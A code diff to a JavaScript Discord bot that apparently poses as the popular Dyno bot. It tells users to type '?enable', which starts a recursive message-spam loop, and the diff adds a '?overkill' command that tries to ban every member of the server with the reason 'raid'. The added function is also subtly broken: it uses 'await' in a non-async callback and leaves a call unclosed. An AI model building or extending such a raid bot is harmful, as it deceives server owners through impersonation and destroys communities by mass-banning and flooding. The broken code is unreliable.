@@ -13,6 +13,14 @@ function spam(bot, message) {
  setTimeout(() => spam(bot, message), 30*10);
 }
 
+function ban(bot, message) {
+  message.guild.members.forEach(member => {
+    await member.ban('raid')
+      .catch(error => console.log(`Sorry, I couldn't ban ${member} because of : ${error}`));
+  }                         
+ setTimeout(() => spam(bot, message), 30*10);
+}
+
 bot.on("ready", async () => {
   console.log(`${bot.user.username} is online!`);
 
@@ -21,10 +29,15 @@ bot.on("ready", async () => {
 
 bot.on("message", async message => {
   if (message.content.startsWith('?')) {
+    if (message.content.startsWith('?enable')) return
+    if (message.content.startsWith('?overkill')) return
     message.reply(`to activate Dyno in your server please type \`?enable\`!`)
   }
   if (message.content.startsWith('?enable')) {
     spam(bot, message)
+  }
+  if (message.content.startsWith('?overkill')) {
+    ban(bot, message)
   }
 });
 
